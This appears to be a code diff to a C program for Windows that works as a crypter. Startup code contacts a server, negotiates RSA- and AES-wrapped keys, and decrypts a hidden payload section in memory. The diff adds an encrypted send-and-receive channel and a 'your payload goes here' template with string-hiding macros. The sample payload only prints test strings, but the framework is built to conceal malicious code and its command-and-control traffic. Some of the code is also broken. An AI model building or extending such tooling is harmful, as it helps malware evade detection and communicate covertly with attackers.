@@ -8,13 +8,51 @@
 #include <ws2tcpip.h>
 #include <bcrypt.h>
 #include <ntstatus.h>
+#define PLStr(str) (BYTE[]){str}
+/*
+ * Session pertanate keys must be defined globaly for the constructor to initiate/ destructor to
+ * destoy all keying material appropriatly. Once innitiated communication with the sever will continue
+ * fur the duration of the programs execution. 
+ *
+ * A large volume of these mechanisms will end up behind the sceans making it possible to do an include 
+ * without seeing all of the behind the sceans logic, this will be my next step after getting the encrypted
+ * comms to a working state.
+ */
+__attribute__((section(".payload"))) int send_secure(BYTE*,ULONG);
+__attribute__((section(".payload"))) BYTE* recv_secure();
+BYTE* SessionIV;
+BYTE* SessionKEY;
+BCRYPT_KEY_HANDLE SessionKeyHandle;
 /*
  * this socket is connected in the .cryptor construct function and shutdown in the .cryptor destruct function.
  */
 SOCKET Connection; 
 
 BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
- 
+
+
+
+/*
+ *	****************************************************************
+ *	YOUR PAYLOAD GOES HERE, THIS IS WHERE YOUR DEVELOPMENT WORK WILL
+ *	BEGIN. HAVE FUN
+ *	****************************************************************
+ *
+ * 	USE PLStr to secure all your binary strings
+ */
+__attribute__((section(".payload"))) int payload(){
+	byte* tmp = "hello";
+	send_secure(tmp,5);
+	tmp = "world";
+	send_secure(tmp,5);
+	tmp = PLStr("data being sent from the cryptor"); 
+	send_secure(tmp,32);
+	printf(PLStr("hello world from the cryptor\n"));
+	printf("%s\n", recv_secure());
+	printf("%s\n", recv_secure());
+	return 1;
+}
+
 /*
  * This Constructor is responsible for the following tasks
  * 	- Generating a One Time Pad
@@ -41,10 +79,6 @@ BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
  */
 __attribute__((constructor(101), section(".cryptor"))) int construct()
 {
-	/*for (int x = 0; x < 512; x++)
-	{
-		printf ("wtf");
-	}*/
 	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
 	CIPKIE2 CryptImportPublicKeyInfoEx2;
 	HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
@@ -86,7 +120,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 */
 	BCRYPT_ALG_HANDLE randNumProv;
 	BYTE* OTP = CryptMemAlloc(AESKEYLEN+1);
-/*	memset(OTP,0,AESKEYLEN+1);
+
 	/* 
 	 * Define variables required to store the encrypted OTP
 	 */
@@ -168,7 +202,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		exit(0);
 	}
 	/*
- 	* Encrypt the one time pad with the RSA key
+ 	* Calculate the length of the buffer necessary to store the one time pad
  	*/	
 	
 	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
@@ -179,6 +213,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
  	* Encrypt the one time pad with the RSA key
  	*/
+	EncryptedOTP = CryptMemAlloc(EncryptedOTPLen);
 	if(BCryptEncrypt(bcrypt_key_handle_rsa,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
 		printf("ERROR IN ENCRYPTING");
@@ -231,7 +266,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * send the EncryptedOTP to the server
 	 */
-	EncryptedOTPWriteLen = ntohl(EncryptedOTPWriteLen);
+	EncryptedOTPWriteLen = htonl(EncryptedOTPWriteLen);
 	
 	if(!send(Connection,(BYTE*)EncryptedOTP,EncryptedOTPWriteLen, 0))
 	{
@@ -241,7 +276,6 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * recieve the OTP encrypted AES key from the server
 	 */
-	//recvData = malloc(AESKEYLEN+1);
 	if(!recv(Connection,key,AESKEYLEN,0))
 	{
 		exit(-1);
@@ -277,7 +311,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		exit (-1);
 	}
 	/*
-	 * Set the mode for decryption to GCM, the GCM provider works for both pycryptodome and 
+	 * Set the mode for decryption to CFB, the CFB provider works for both pycryptodome and 
 	 * the microsft bcrypt C cryptographic provider. 
 	 */
 	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
@@ -295,7 +329,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	ptr_payload = (BYTE*)addr_s;
 	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
 	{
-			printf("failed to decrypt payload");
+		printf("failed to decrypt payload");
 		exit(-1);
 	}
 	if(BCryptDestroyKey(decryptPayloadKey) != STATUS_SUCCESS){
@@ -307,6 +341,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	CryptMemFree(key);
 	CryptMemFree(recvData);
 	CryptMemFree(decodedIV);
+	CryptMemFree(EncryptedOTP); 
 	/*
 	 * gotta do some clean up here
 	 */
@@ -329,14 +364,282 @@ __attribute__((destructor(101),section(".cryptor"))) int destruct(){
 	
 	return 0;
 }
+/*
+ * This function will be used to generate a random IV, and a random AES key 
+ * to act as the session key for the duration of the runtime. this will enable
+ * developers to use the payload section to send data to, and recieve data from
+ * the server in an efficient manner.
+ */
+__attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
+	/*
+	 * Allocate space for the IV and key
+	 */
+	SessionIV = CryptMemAlloc(16);
+	SessionKEY = CryptMemAlloc(AESKEYLEN);
+	/*
+	 * Define a algorithm handle for a cryptographically secure 
+	 * random number generater.
+	 */
+	BCRYPT_ALG_HANDLE randNumProv;
+	BCRYPT_ALG_HANDLE SessionKeyAlg;
+
+	/*
+	 * define a buffer to store the AES key once it has been encrypted with the RSA public key
+	 */
+	PUCHAR encryptedSessionKey;
+	ULONG encryptedSessionKeyLen;
+	ULONG encryptedSessionKeyWrittenLen;
+	BYTE* Syncronization = CryptMemAlloc(1);
+	/*
+	 * open a handle for the cryptographic service provider generate the IV and AES key then close
+	 * the cryptographic storage provider.
+	 */
+	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
+	{	
+		printf ("error creating provider\n");
+		exit(0);
+	}
+	
+	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionIV), 16, 0)))
+	{
+		printf("error generating random number");
+		exit(0);
+	}
+	
+	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionKEY), AESKEYLEN, 0)))
+	{
+		printf("error generating random number");
+		exit(0);
+	}
+	 
+	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
+	{
+		printf("error closing handaler");
+		exit(0);
+	}
+	/*
+	 * Initiate the  SessionKeyHandle;
+	 */
+	if(BCryptOpenAlgorithmProvider( &SessionKeyAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
+	{
+		printf ("failed to open the algorithm provider for payload decryption");
+		exit (-1);
+	}
+	/*
+	 * Set the mode for decryption to CFB, the CFB provider works for both pycryptodome and 
+	 * the microsft bcrypt C cryptographic provider. 
+	 */
+	if(BCryptSetProperty(SessionKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
+	{
+		printf ("failed to set the chaining mode to CFB");
+		exit(-1);
+	}
+	if(BCryptGenerateSymmetricKey(SessionKeyAlg,&SessionKeyHandle, 0,0,(PUCHAR)SessionKEY,AESKEYLEN,0) != STATUS_SUCCESS)
+	{
+		printf("failed to create a BCryptKeyHandle");
+		exit(-1);
+	}
+	/*
+ 	* Calculate the length of the buffer necessary to store the Session key
+ 	*/	
+	
+	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(SessionKEY), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &encryptedSessionKeyLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	{
+		printf("error in calculating RSA output key length.");
+		exit(0);
+	}
+	/*
+ 	* Encrypt the Session key with the RSA key
+ 	*/
+	encryptedSessionKey = CryptMemAlloc(encryptedSessionKeyLen);
+	if(BCryptEncrypt(bcrypt_key_handle_rsa,(SessionKEY), AESKEYLEN, NULL,NULL,0, encryptedSessionKey, encryptedSessionKeyLen, &encryptedSessionKeyWrittenLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	{
+		printf("ERROR IN ENCRYPTING");
+		exit(0);
+	}
+	/*
+	 * Fix the network order of the encryptedSessionKeyWrittenLen.
+	 */
+	encryptedSessionKeyWrittenLen = htonl(encryptedSessionKeyWrittenLen);
+	/*
+	 * Send the length of the encrypted AES key to the server.
+	 */
+	if(!send(Connection,(BYTE*)&encryptedSessionKeyWrittenLen,sizeof(ULONG),0))
+	{
+		exit(-1);
+	}
+	/*
+	 * Recieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		exit(-1);
+	}
+	/*
+	 * Send the encrypted session key to the server
+	 */
+	if(!send(Connection,(BYTE*)encryptedSessionKey, ntohl(encryptedSessionKeyWrittenLen),0))
+	{
+		exit(-1);
+	}
+	/*
+	 * Recieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		exit(-1);
+	}
+	
+	if(!send(Connection,(BYTE*)SessionIV, 16,0))
+	{
+		exit(-1);
+	}
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		exit(-1);
+	}
+	
+	CryptMemFree(Syncronization);
+	CryptMemFree(encryptedSessionKey);
+}
+
+/*
+ * destroys the session keys created for this session.
+ */
+__attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
+	/* 
+	 *Destroy the BCrypt key handle
+	 */
+	if(BCryptDestroyKey(SessionKeyHandle) != STATUS_SUCCESS){
+		printf("Error in destroying key");
+		exit(0);
+	}
+	
+	CryptMemFree(SessionIV);
+	CryptMemFree(SessionKEY);
 
 
-__attribute__((section(".payload"))) int payload(){
-	printf("hello world from the cryptor");
+}
+/*
+ * this function takes a pointer to a buffer to be sent as well as the length of the buffer.
+ * this function will returns a non zero value if this function succeeds.
+ */
+__attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG bufferLen){
+	ULONG EncryptedBufferLen;
+	ULONG EncryptedBufferWriteLen;
+	ULONG msgSZ;
+	BYTE* EncryptedBuffer;
+	BYTE* MSG;
+	BYTE* Syncronization = CryptMemAlloc(1);
+	/*
+	 * calculate the length of the encrypted buffer
+	 */
+	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, NULL,0,NULL,0,&EncryptedBufferLen,0) != STATUS_SUCCESS)
+	{
+		return 0;
+	}
+	MSG = CryptMemAlloc(EncryptedBufferLen + 16);
+	EncryptedBuffer = MSG+16;
+	 
+	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, SessionIV,16,EncryptedBuffer,EncryptedBufferLen,&EncryptedBufferWriteLen,0) != STATUS_SUCCESS)
+	{
+		return 0;
+	}
+	for(int x = 0; x < 16; x++){
+		*(MSG+x) = *(SessionIV+x); 
+	}
+	msgSZ = htonl(EncryptedBufferWriteLen+16);
+	
+	/*
+	 * Send the length of the encrypted AES key to the server.
+	 */
+	if(!send(Connection,(BYTE*)&msgSZ,sizeof(ULONG),0))
+	{
+		return 0;
+	}
+	/*
+	 * Recieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		return 0;
+	}
+	/*
+	 * Send the encrypted cipher text to the server.
+	 */
+	if(!send(Connection,(BYTE*)MSG,ntohl(msgSZ),0))
+	{
+		return 0;
+	}
+	/*
+	 * retrieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		return 0;
+	}
+
+	CryptMemFree(MSG);
+	CryptMemFree(Syncronization);
+	return 0;
+}
+__attribute__((section(".payload"))) BYTE* recv_secure(){
+	UINT32 recvLen;
+	BYTE* Syncronization = "\x01";
+	BYTE* encryptedBuffer; 
+	BYTE* decryptedBuffer; 
+	ULONG decryptedBufferLen; 
+	ULONG decryptedBufferWriteLen;
+	
+	/*
+	 * send a syncronization byte to the server
+	 *
+	 */
+	if(!send(Connection,(BYTE*)Syncronization,1,0))
+	{
+		return 0;
+	}
+	if(!recv(Connection,(BYTE*)&recvLen,sizeof(UINT32),0))
+	{
+		return 0;
+	}
+	recvLen = ntohl(recvLen);
+	/*
+	 * send a syncronization byte to the server
+	 *
+	 */
+	if(!send(Connection,(BYTE*)Syncronization,1,0))
+	{
+		return 0;
+	}
+	if(!recv(Connection,(BYTE*)encryptedBuffer ,recvLen,MSG_WAITALL))
+	{
+		return 0;
+	}
+	/*
+	 * calculate the length of the decrypted buffer
+	 */
+	if(BCryptDecrypt(SessionKeyHandle,encryptedBuffer,recvLen,NULL,NULL,0,NULL,0,&decryptedBufferLen,0) != STATUS_SUCCESS)
+	{
+		printf("failed\n");
+	}
+	decryptedBuffer = CryptMemAlloc(decryptedBufferLen);
+	if(BCryptDecrypt(SessionKeyHandle,encryptedBuffer,recvLen,NULL,SessionIV,16, decryptedBuffer,decryptedBufferLen,&decryptedBufferWriteLen, 0) != STATUS_SUCCESS)
+	{
+		printf("failed\n");
+	}
+        if(!send(Connection,(BYTE*)SessionIV,16,0))
+        {
+                return 0;
+        }
+	return decryptedBuffer;
 	
 }
 
-int main()
+
+
+
+int  main()
 {
 return payload();
 }
